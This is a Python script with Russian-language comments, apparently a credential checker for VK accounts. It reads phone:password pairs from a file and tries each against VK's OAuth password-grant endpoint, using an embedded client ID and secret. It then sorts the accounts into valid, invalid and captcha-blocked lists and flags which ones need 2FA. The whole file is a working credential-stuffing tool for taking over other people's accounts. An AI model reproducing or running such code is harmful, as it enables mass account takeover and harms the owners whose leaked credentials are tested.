#Author vk.com/tenderlua
#Идею подкинул: vk.com/winten1

import requests
import re

account = []
try:
	files = open("accounts/db.txt", "r")
	with files as file:
		for line in file:
			line = [x.strip() for x in line.split(":")]
			lap = (line[0], line[1])
			account.append(lap)
	line_string = sum(1 for l in open('accounts/db.txt', 'r')) #высчитывает кол-во строк в файле, почему это? Потому что с len проблемы нахуй, и оно вычисляет длину строки, а не кол-во строк
	if line_string > int(0):
		print("Всего аккаунтов в базе: " + str(line_string))
	else:
		print("Аккаунтов в базе данных нету! Запишите их в базу данных в формате: НОМЕР:ПАРОЛЬ. К примеру: 78005553535:qwerty123")
	for x in range(line_string):
		#print(line_string[x])
		print("\nПроверка аккаунта на валидность со след. данными:\n" + "Номер телефона: " + account[x][0] + "\nПароль: " + account[x][1] + "\n")
		result = requests.get("https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=" + account[x][0] + "&password=" + account[x][1] + "")
		#print(result.json()) #выводит результат в формате json
		print("Все акканты были распределены в valid.txt и invalid.txt. Где valid.txt - валидные аккаунты, где invalid.txt - не рабочие аккаунты. Данные файлы находятся в папке accounts")
		try:
			result.json()["error"]
		except: #нету ключа error
			#print("[SUCCESS] Аккаунт рабочий! Не требуется 2FA!")
			val = open("accounts/valid.txt", "a")
			val.write("Phone number: " + account[x][0] + "\n" + "Password: " + account[x][1] + "\n" + "Comment: None" + "\n\n")
			val.close()
		else: #есть ключ error
			if result.json()["error"] == "need_validation":
				#print("[2FA] Нужно подтверждение входа в аккаунт! А так, аккаунт рабочий!")
				twofa = open("accounts/valid.txt", "a")
				twofa.write("Phone number: " + account[x][0] + "\n" + "Password: " + account[x][1] + "\n" + "Comment: Required 2FA" + "\n\n")
				twofa.close()
			elif result.json()["error"] == "need_captcha":
				print("К сожалению, этот аккаунт проверить не удалось, т.к. потребовалась Google Captcha! Повторите попытку позже с этим аккаунтом!")
				uncheck = open("accounts/uncheck.txt", "a")
				uncheck.write("Phone number: " + account[x][0] + "\n" + "Password: " + account[x][1] + "\n" + "Comment: Required Verifed Google Captcha" + "\n\n")
				uncheck.close()
			#elif result.json()["error"] == "invalid_client":
			else:
				#print("[ERROR] Аккаунт не рабочий! Неверный логин/пароль!")
				inval = open("accounts/invalid.txt", "a")
				inval.write("Phone number: " + account[x][0] + "\n" + "Password: " + account[x][1] + "\n" + "Comment: None" + "\n\n")
				inval.close()
except FileNotFoundError:
	print("Файл 'db.txt' с аккаунтами не был найден! Создайте его в папке accounts, и запишите туда данные от аккаунтов в формате НОМЕР:ПАРОЛЬ")
except IndexError:
	print("Аккаунты записаны в 'db.txt' неверно! Записывать их нужно так: НОМЕР:ПАРОЛЬ. К примеру: 78005553535:qwerty123")
